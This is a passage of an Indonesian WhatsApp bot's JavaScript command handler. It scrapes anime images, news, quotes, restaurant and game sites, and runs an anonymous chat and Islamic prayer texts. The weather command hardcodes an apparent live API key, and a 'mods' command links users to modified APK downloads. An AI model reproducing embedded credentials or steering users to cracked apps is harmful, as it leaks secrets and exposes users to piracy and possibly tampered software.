    if (response.result[0].includes('map')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].includes('...')) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (/[^\x00-\x7F]/.test(response.result[0])) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (/(?:\.\.\.|[\u2026])/.test(response.result[0])) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    if (response.result[0].length > 300) {
      return reply(`Coba Kata Kunci Lain!`)
    }
    reply(response.result[0])
  })
}
break
 /* 

Credits: SlimexTzy
Jenis fitur: random foto anime hd

*/

case 'kcrandom': case 'kcimg': {
async function animeRandom() {
    try {
        let response = await axios.get('https://konachan.net/post?tags=order%3Arandom');
        let $ = cheerio.load(response.data);
        let hasil = {
            status: 200,
            creator: 'zaenishi',
            imageUrl: []
        };
        $('#post-list-posts a.directlink.largeimg').each((index, element) => {
            hasil.imageUrl.push( $(element).attr('href') );
        });
        return hasil;
    } catch (error) {
        console.error('Error:', error);
return error
    }
}

react('🕐', m.chat, m.key)
try {
let response = await animeRandom()
let random = pickRandom(response.imageUrl)

slime.sendMessage(m.chat, { image: { url: random }, caption: 'Random Image Anime\n\n*Powered By SlimexTzy*' }, { quoted: m })
} catch (e) {
reply(e)
}
}
break
 /* 

Credits: SlimexTzy
Jenis fitur: mencari mod apk

*/

case 'mods': case 'modapk': {
  const axios = require('axios')
  const cheerio = require('cheerio')

  async function mods(apk) {
    const url = `https://m.happymod.com/search.html?q=${apk}`

    const response = await axios.get(url)
    const html = response.data
    const $ = cheerio.load(html)

    const apps = []

    $('.app-info-list .s-app-block').each((index, element) => {
      const app = {
        creator: 'zaenishi',
        status: 200,
        title: $(element).find('.info-wrap .nowrap a').text().trim(),
        image: $(element).find('.img img').attr('data-src'),
        downloadUrl: `https://m.happymod.com${$(element).find('.down a').attr('href')}`
      }
      apps.push(app)
      if (apps.length >= 5) return false
    })

    return apps
  }

  if (text) {
    const response = await mods(text)
    let result = ''

    response.forEach((app, index) => {
      result += `*${index + 1}*. ${app.title}:\n`
      result += `∘ Download ${app.downloadUrl}\n\n`
    })

    slime.sendMessage(m.chat, {
      text: result,
      contextInfo: {
        externalAdReply: {
          showAdAttribution: false,
          title: `M O D S  S E A R C H`,
          body: `Looking for Cool and Free Apk Mods!`,
          sourceUrl: 'https://m.happymod.com',
          thumbnailUrl: thurl,
          mediaType: 1,
          renderLargerThumbnail: true
        }
      }
    })
  } else {
    reply(`Masukan Text, *Seperti Format Ini*: .${command} minecraft`)
  }
}
break
 /* 

Credits: SlimexTzy
Jenis fitur: mencari berita tentang islam di dunia, lengkap, dan terbaru

*/

case 'islamnews': case 'islamn': {
const axios = require('axios')
const cheerio = require('cheerio')

async function islamNews() {
        try {
            const response = await axios.get('https://www.cnbcindonesia.com/tag/islam')
            const $ = cheerio.load(response.data) 
            let result = []

            $('li').each((index, element) => {
                const link = $(element).find('a').attr('href')
                const imgSrc = $(element).find('.ratiobox_content.lqd img').attr('src')
                const titleElement = $(element).find('h2')
                const dateElement = $(element).find('.date')

                if (titleElement.length > 0 && dateElement.length > 0) {
                    const title = titleElement.text().trim()
                    const date = dateElement.text().trim()

                    result.push({
                        creator: 'zaenishi',
                        status: 200,
                        link: link,
                        img: imgSrc,
                        title: title,
                        date: date
                    })
                }
            })

            return result
        } catch (error) {
            console.error('Error fetching data:', error.message)
            throw error
        }
    }

if (!text) {
islamNews().then(result => {
        if (result.length > 0) {
            let islamText = ''
            result.forEach((news, index) => {
                islamText += `*${index + 1}. ${news.title}* ${news.date}\n\n∘ ${news.link}\n\n`
            })
            reply(islamText + `*Untuk Mendapatkan Info Selanjutnya Silahkan Ketik .${command} <url>*`)
        } else {
            reply('No data found.')
        }
    }).catch(error => {
        console.error('Error:', error.message)
        reply('An error occurred while fetching data. Please try again later.')
    })
} else {
async function islamData(url) {
const cheerio = require('cheerio')
let zaenishi = await axios.get(url)
let $ = cheerio.load(zaenishi.data)
let result = []
let title = $('.jdl'). find('.container').find('h1').text()
let desk = $('.detail_text').find('p').text()
result.push({

title: title,
desk: desk
})
return result
}
islamData(text).then(respon => {
let islamText = `*${respon[0].title}*\n\n${respon[0].desk}`
reply(islamText)
})
}
}
break
 /* 

Credits: SlimexTzy
Jenis fitur: mencari kata kata/quotes dari goodreads berdasarkan nama tokoh

*/
case 'quotes':
case 'quotess':
case 'goodreads': {
  async function quotess(nama) {
    const cheerio = require('cheerio')
    let zaenishi = await axios.get(`https://www.goodreads.com/quotes/search?q=${nama}`)
    let $ = cheerio.load(zaenishi.data)
    let hasil = []

    $('.quoteText').each((index, element) => {
      let selectedQuote = $(element).clone()
        .children()
        .remove()
        .end()
        .text()
        .replace(/\s+/g, ' ')
        .replace(/―/g, '')
        .trim()

      let selectedAuthor = $(element).find('.authorOrTitle').text().trim()
      let formattedAuthor = selectedAuthor.replace(/\s+/g, ' ').trim()

      hasil.push({
        creator: 'zaenishi',
        status: 200,
        quotes: selectedQuote,
        author: formattedAuthor
      })
    })

    return hasil
  }

  if (!text) return reply(`*Quotes Siapa?* .${command} <nama>`)

  quotess(text).then(respon => {
    if (respon.length > 0) {
      const randomIndex = Math.floor(Math.random() * respon.length)
      const formattedResult = `${respon[randomIndex].quotes}\n\n*- ${respon[randomIndex].author}*`
      reply(formattedResult)
    } else {
      reply(`Quotes Tidak Ditemukan`)
    }
  })
  }
  break
 /* 

Credits: SlimexTzy
Jenis fitur: mencari kuliner di kota anda, berdasarkan kota bahkan ras

*/

case 'kuliner': {
  async function ku(ajur) {
    const cheerio = require('cheerio')
    const axios = require('axios')

    try {
      const response = await axios.get(`https://info-kuliner.com/category/masakan-${ajur}/`)
      const $ = cheerio.load(response.data)
      const result = []

      $('.post').each((index, element) => {
        const nama = $(element).find('.entry-title').text().trim()
        const link = $(element).find('.entry-title a').attr('href')
        const ct = $(element).find('.entry-content').text().trim()

        result.push({
          creator: 'zaenishi',
          status: 200,
          nama: nama,
          link: link,
          ct: ct
        })
      })

      return result
    } catch (error) {
      throw error
    }
  }

  async function zaenar(url) {
    const cheerio = require('cheerio')
    try {
      const zaenishi = await axios.get(url)
      const $ = cheerio.load(zaenishi.data)
      let hasil = []
      let deskripsiText = ''

      const unwantedStrings = [
        'Your email address will not be published.',
        'Comment',
        'Name *',
        'Email *',
        'Website',
        'Save my name, email, and website in this browser for the next time I comment.',
        'Shark Magazine By SlimexTzy',
        'Shark Magazine',
        'By SlimexTzy',
        'Copyright © 2019 | All Rights Reserved',
        'Info Kuliner',
        'Rumah Makan | Restoran | Tempat Makan | Cafe'
      ]

      $('p').each((index, element) => {
        const deskripsi = $(element).text().trim()
        if (!unwantedStrings.some(unwanted => deskripsi.includes(unwanted))) {
          deskripsiText += `${deskripsi}\n`
        }
      })

      const ogImageUrl = $('meta[property="og:image"]').attr('content')

      hasil.push({
        creator: 'zaenishi',
        result: deskripsiText.trim(),
        gambar: ogImageUrl
      })

      return hasil
    } catch (error) {
      throw error
    }
  }

  if (!text) return reply(`*Format Seperti Ini* .${command} sunda`)
  
if (text.includes('https://info-kuliner')) {
  try {
    const response = await zaenar(text)
    const formattedResult = response[0].result
      .replace(/\n\s*\n/g, '\n\n')
      .trim()
    reply(formattedResult)
  } catch (error) {
    console.error('Error:', error.message)
    reply('Terjadi kesalahan dalam mengambil data. Silakan coba lagi nanti.')
  }
} else {
  try {
    const result = await ku(text)

    if (result.length > 0) {
      let replyText = `*Daftar Tempat Kuliner ${text}:*\n\n*Ketik .${command} <url> Untuk Melihat Info Rumah Makan*\n\n`

      result.forEach((entry, index) => {
        replyText += `*${index + 1}. ${entry.nama}*\n   ${entry.link}\n   ${entry.ct}\n\n`
      })

      reply(replyText)
    } else {
      reply(`Maaf, tidak ada data kuliner ${text} yang ditemukan.`)
    }
  } catch (error) {
    console.error('Error:', error.message)
    reply(`Terjadi kesalahan dalam mengambil data ${error.message}. Silakan coba lagi nanti.`)
  }
}
}
break
 /* 

Credits: SlimexTzy
Jenis fitur: rekomendasi game, terbaru berdasarkan tahun

*/

case 'rekomendasi_game':
    case 'gamepop': {
    const cheerio = require('cheerio')
    
    async function meme() {
  try {
    const response = await axios.get('https://carisinyal.com/category/games/')
    const $ = cheerio.load(response.data)

    const recommendations = []

    $('.oxy-post-wrap').each((index, element) => {
      const title = $(element).find('.oxy-post-title').text().trim()
      const url = $(element).find('.oxy-post-title').attr('href')

      recommendations.push({
        creator: 'zaenishi',
        status: 200,
        title,
        url
      })
    })

    return recommendations
  } catch (error) {
    console.error('Error fetching or parsing data:', error.message)
  }
}

async function meme1(url) {
  try {
    const response = await axios.get(url)
    const $ = cheerio.load(response.data)

    const asu = []

    $('.wp-block-heading').each((index, element) => {
      const name = $(element).text().trim()
      asu.push({
        creator: 'zaenishi',
        status: 200,
        name: `${name}`
      })
    })

    return asu
  } catch (error) {
    console.error('Error fetching or parsing data:', error.message)
  }
}

      if (!text) {
      try {
        const recommendations = await meme()
        const recommendationText = recommendations.map((rec, index) => `*${index + 1}.* ${rec.title} ${rec.url}`).join('\n\n')
        reply(`${recommendationText}\n\n*Salin URL dan ketik .${command} (URLnya)*`)
        } catch (e) {
        reply(`Mungkin Ada Masalah.`)
        }
      } else {
            try {
        const meme1Result = await meme1(text)
        const meme1Text = meme1Result.map((meme, index) => `${meme.name}`).join('\n')
        reply(meme1Text)
              } catch (e) {
        reply(`Url Tidak Tersedia, Atau terjadi Masalah`)
        }
        }
      }
      break /*
   Creator: SlimexTzy
   Team: HengkerTzy
   All Info: https://linktr.ee/slimextzy
*/

case 'otakudessearch': case 'animes': case 'otaksearch': {
const axios = require('axios');
const cheerio = require('cheerio');

async function anu(search) {
 const url = 'https://otakudesu.cloud/?s=' + search + '&post_type=anime';

 try {
   let response = await axios.get(url);
   const $ = cheerio.load(response.data);

   const results = [];

   $('ul.chivsrc li').each((index, element) => {
     const title = $(element).find('h2 a').text();
     const link = $(element).find('h2 a').attr('href');
     const image = $(element).find('img').attr('src');
     const genres = [];

     $(element).find('.set a').each((i, el) => {
       genres.push($(el).text());
     });

     const status = $(element).find('.set:contains("Status")').text().replace('Status : ', '');
     const rating = $(element).find('.set:contains("Rating")').text().replace('Rating : ', '');

     results.push({ title, link, image, genres, status, rating });
   });

   return results;
 } catch (error) {
   console.error("Error fetching data:", error);
 }
}

async function ah(search) {
  let ngent = '';
  try {
    let response = await anu(search);
    let genre = [];
    response[0].genres.forEach((element, index) => {
      genre.push(`(${element})`);
    });
    ngent = `*👀 ANIME SEARCH*

\`nama:\` ${response[0].title}
\`link:\` ${response[0].link}
\`image:\` ${response[0].image}
\`genres:\` ${genre.join(', ')}
\`status:\` ${response[0].status}
\`rating:\` ${response[0].rating}`;
  } catch (error) {
    console.error(error);
  }
  return ngent;
}

if (!text) return reply('Penggunaan: .otakudesSearch shinigami')
ah(text).then(response => {
reply(response)
})
}
break
 /*
   Creator: SlimexTzy
   Team: HengkerTzy
   All Info: https://linktr.ee/slimextzy
*/

case 'otakudesdetails': case 'detailsanime': case 'animedetail': {
async function otakudesDetails(link) {
    try {
        const zaenishi = await axios.get(link);
        const $ = cheerio.load(zaenishi.data);
        const hasil = [];

        const judul = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Judul')).parent().text().trim().split(': ')[1];
        const skor = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Skor')).parent().text().trim().split(': ')[1];
        const produser = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Produser')).parent().text().trim().split(': ')[1];
        const tipe = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Tipe')).parent().text().trim().split(': ')[1];
        const status = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Status')).parent().text().trim().split(': ')[1];
        const studio = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Studio')).parent().text().trim().split(': ')[1];
        const rilis = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Tanggal Rilis')).parent().text().trim().split(': ')[1];
        const episode = $('div.infozingle span b').filter((index, element) => $(element).text().includes('Total Episode')).parent().text().trim().split(': ')[1];
        let sinopsis = '';
        $('.sinopc p').each((index, element) => {
            sinopsis += $(element).text().trim() + '\n';
        });
        const genreArray = [];
        $('div.infozingle span b').filter((index, element) => $(element).text().includes('Genre')).siblings('a').each((index, element) => {
            genreArray.push($(element).text().trim());
        });
        const genre = genreArray.join(', ');

        hasil.push({
            judul: judul,
            skor: skor,
            produser: produser,
            tipe: tipe,
            status: status,
            studio: studio,
            rilis: rilis,
            episode: episode,
            genre: genre,
            sinopsis: sinopsis.trim()
        });

        return hasil;
    } catch (error) {
        console.error('Error:', error);
        return [];
    }
}

if (!text) return reply(`Ikuti contoh penggunaan ini: .${command} https://otakudesu.cloud....`)
let response = await otakudesDetails(text)
if (response.length === 0) return reply(`Gagal Mendapatkan Respon Api.`)
reply(`*📰 Anime Details OtakudesuDetails*
Judul: ${response[0].judul}
Skor: ${response[0].skor}
Produser: ${response[0].produser}
Tipe: ${response[0].tipe}
Status: ${response[0].status}
Studio: ${response[0].studio}
Rilis: ${response[0].rilis}
Episode: ${response[0].episode}
Genre: ${response[0].genre}

*📖 Sinopsis:*\n\n${response[0].sinopsis}`)
}
break

              case 'sendprofile': case 'sendprofil':
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romoe = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romoe) {
reply(`⚠️ Kamu belum pernah memulai chat!\n\n${prefix}start -- _Mencari partner_`)
//var teks = `⚠️ Kamu belum pernah memulai chat!`
//await slime.sendMessage(m.chat, { text: teks, footer: footxt, templateButtons: but })
return false
} else {
let rms = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state == "CHATTING")
var partnerJID = rms.other(m.sender)
var rees = await slime.sendContact(partnerJID, [m.sender.split("@")[0]])
slime.sendMessage(m.chat, { text: '✅ Berhasil mengirim profil ke teman chat anda!' }, { quoted: m })
slime.sendMessage(partnerJID, { text: '👨👩 Teman chat kamu memberikan kontak profil nya!' }, { quoted: rees })
}
break
//=========================================\\======
case 'anonymouschat': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
reply(`Hi ${pushname} Welcome To Anonymous Chat\n\n${prefix}start -- _mencari partner_`)
 }
break
//=========================================\\======
case 'mulai': case 'start': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
reply(`Kamu Masih Berada Di dalam Sesi Anonymous\n\n${prefix}keluar -- _keluar dari sesi chat_`)
return false
}
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
slime.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
break
}
case 'next': case 'lanjut': {
if (m.isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
this.anonymous = this.anonymous ? this.anonymous : {}
let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
if (!romeo) {
reply(`Kamu Sedang Tidak Berada Di Sesi Anonymous\n\n${prefix}start -- _mencari partner_`)
return false
}
let other = romeo.other(m.sender)
if (other) await slime.sendText(other, `Partner Telah Meninggalkan Sesi Anonymous`, m)
delete this.anonymous[romeo.id]
let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
if (room) {
slime.sendMessage(room.a, {text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`})
room.b = m.sender
room.state = 'CHATTING'
reply(`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\n\n${prefix}skip -- _mencari partner lain_\n${prefix}stop -- _menghentikan sesi chat_`)
} else {
let id = + new Date
this.anonymous[id] = {
id,
a: m.sender,
b: '',
state: 'WAITING',
check: function (who = '') {
return [this.a, this.b].includes(who)
},
other: function (who = '') {
return who === this.a ? this.b : who === this.b ? this.a : ''
},
}
reply(`Mohon Tunggu Sedang Mencari Partner`)
}
}
break
//=========================================\\======
case 'quotesanime':
case 'quotesanim': {
  let res = await (await fetch('https://katanime.vercel.app/api/getrandom?limit=1'))
  if (!res.ok) return await res.text()
  let json = await res.json()
  if(!json.result[0]) return json
  let { indo, character, anime } = json.result[0]
  reply(`${indo}\n\n📮By:  _${character}_ \nAnime:\n${anime}`)
}
break
 case 'quotesbacot': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const bacot = [
'Kamu suka kopi nggak? Aku sih suka. Tau kenapa alesannya? Kopi itu ibarat kamu, pahit sih tapi bikin candu jadi pingin terus.',
'Gajian itu kayak mantan ya? Bisanya cuman lewat sebentar saja.',
'Kata pak haji, cowok yang nggak mau pergi Sholat Jumat disuruh pakai rok aja.',
'Kamu tahu mantan nggak? Mantan itu ibarat gajian, biasa numpang lewat dong di kehidupan kita.',
'Aku suka kamu, kamu suka dia, tapi dia sayangnya nggak ke kamu. Wkwkw lucu ya? Cinta serumit ini.',
'Google itu hebat ya? Tapi sayang sehebat-hebatnya Google nggak bisa menemukan jodoh kita.',
'Terlalu sering memegang pensil alis dapat membuat mata menjadi buta, jika dicolok-colokkan ke mata.',
'Saya bekerja keras karena sadar kalau uang nggak punya kaki buat jalan sendiri ke kantong saya.',
'Jika kamu tak mampu meyakinkan dan memukau orang dengan kepintaranmu, bingungkan dia dengan kebodohanmu.',
'Selelah-lelahnya bekerja, lebih lelah lagi kalau nganggur.',
'Kita hidup di masa kalau salah kena marah, pas bener dibilang tumben.',
'Nggak ada bahu pacar? Tenang aja, masih ada bahu jalan buat nyandar.',
'Mencintai dirimu itu wajar, yang gak wajar mencintai bapakmu.',
'Katanya enggak bisa bohong. Iyalah, mata kan cuma bisa melihat.',
'Madu di tangan kananmu, racun di tangan kirimu, jodoh tetap di tangan tuhan.',
'Selingkuh terjadi bukan karena ada niat, selingkuh terjadi karna pacar kamu masih laku.',
'Netizen kalau senam jempol di ponsel nggak pakai pendinginan, pantes komennya bikin panas terus.',
'Jodoh memang enggak kemana, tapi saingannya ada dimana-mana.',
'Perasaan aku salah terus di matamu. Kalu gitu, besok aku pindah ke hidungmu.',
'Jomblo tidak perlu malu, jomblo bukan berarti tidak laku, tapi memang tidak ada yang mau.',
'Jika doamu belum terkabul maka bersabar, ingatlah bahwa yang berdoa bukan cuma kamu!',
'Masih berharap dan terus berharap lama-lama aku jadi juara harapan.',
'Manusia boleh berencana, tapi akhirnya saldo juga yang menentukan.',
'Statusnya rohani, kelakuannya rohalus.',
'Kegagalan bukan suatu keberhasilan.',
'Tadi mau makan bakso, cuma kok panas banget, keliatannya baksonya lagi demam.',
'Aku juga pernah kaya, waktu gajian.',
'Aku diputusin sama pacar karena kita beda keyakinan. Aku yakin kalau aku ganteng, tapi dia enggak.',
'Masa depanmu tergantung pada mimpimu, maka perbanyaklah tidur.',
'Seberat apapun pekerjaanmu, akan semakin ringan jika tidak dibawa.',
'Jangan terlalu berharap! nanti jatuhnya sakit!',
'Ingat! Anda itu jomblo',
'Gak tau mau ngetik apa',
]
    let bacotan = pickRandom(bacot)
  reply(bacotan)
}
break
 case 'fliptext': {
if (args.length < 1) return reply(`Example:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
reply(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
 case 'kisahnabi': {
     if (!text) return reply(`Masukan nama nabi\nExample: kisahnabi adam`)
     let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
     let kisah = await url.json().catch(_ => "Error")
     if (kisah == "Error") return reply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
     
    let hasil = `_*👳 Nabi :*_ ${kisah.name}
_*📅 Tanggal Lahir :*_ ${kisah.thn_kelahiran}
_*📍 Tempat Lahir :*_ ${kisah.tmp}
_*📊 Usia :*_ ${kisah.usia}

*— — — — — — — [ K I S A H ] — — — — — — —*

${kisah.description}`

     reply(`${hasil}`)

}
break
case 'cuaca':
case 'weather':{
if (!text) return reply('What location?')
            let wdata = await axios.get(
                `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`
            );
            let textw = ""
            textw += `*🗺️Weather of  ${text}*\n\n`
            textw += `*Weather:-* ${wdata.data.weather[0].main}\n`
            textw += `*Description:-* ${wdata.data.weather[0].description}\n`
            textw += `*Avg Temp:-* ${wdata.data.main.temp}\n`
            textw += `*Feels Like:-* ${wdata.data.main.feels_like}\n`
            textw += `*Pressure:-* ${wdata.data.main.pressure}\n`
            textw += `*Humidity:-* ${wdata.data.main.humidity}\n`
            textw += `*Humidity:-* ${wdata.data.wind.speed}\n`
            textw += `*Latitude:-* ${wdata.data.coord.lat}\n`
            textw += `*Longitude:-* ${wdata.data.coord.lon}\n`
            textw += `*Country:-* ${wdata.data.sys.country}\n`

           slime.sendMessage(
                m.chat, {
                    text: textw,
                }, {
                    quoted: m,
                }
           )
           }
           break
           case 'ayatkursi': {
  let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
  reply(caption)
}
break
//=========================================\\
case 'bacaansholat': {
const bacaanshalat = {
  "result": [
    {
      "id": 1,
      "name": "Bacaan Iftitah",
      "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
      "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
      "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
    },
    {
      "id": 2,
      "name": "Al Fatihah",
      "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَا   الصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
      "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
      "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
    },
    {
      "id": 3,
      "name": "Bacaan Ruku",
      "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
      "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
      "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
    },
    {
      "id": 4,
      "name": "Bacaan Sujud",
      "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
      "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
      "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
    },
    {
      "id": 5,
      "name": "Bacaan Duduk Diantara Dua Sujud",
      "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
      "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
      "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
    },
    {
      "id": 6,
      "name": "Duduk Tasyahud Awal",
      "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
      "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
